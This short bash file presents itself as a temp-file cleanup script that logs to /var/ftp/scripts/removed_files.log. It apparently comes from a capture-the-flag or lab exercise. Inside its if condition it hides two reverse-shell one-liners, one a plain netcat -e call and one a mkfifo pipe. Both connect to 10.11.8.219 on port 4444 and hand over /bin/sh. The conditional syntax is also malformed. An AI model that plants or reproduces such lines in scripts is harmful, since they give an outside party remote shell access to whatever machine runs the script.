#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]

## Try get reverse shell basic
nc 10.11.8.219 4444 -e /bin/sh;
## mkfifo
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.8.219 4444 >/tmp/f;

then
        printf "$(whoami) $(date) $(id) | \nRunning cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && printf "$(whoami) $(date) $(id) \n | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
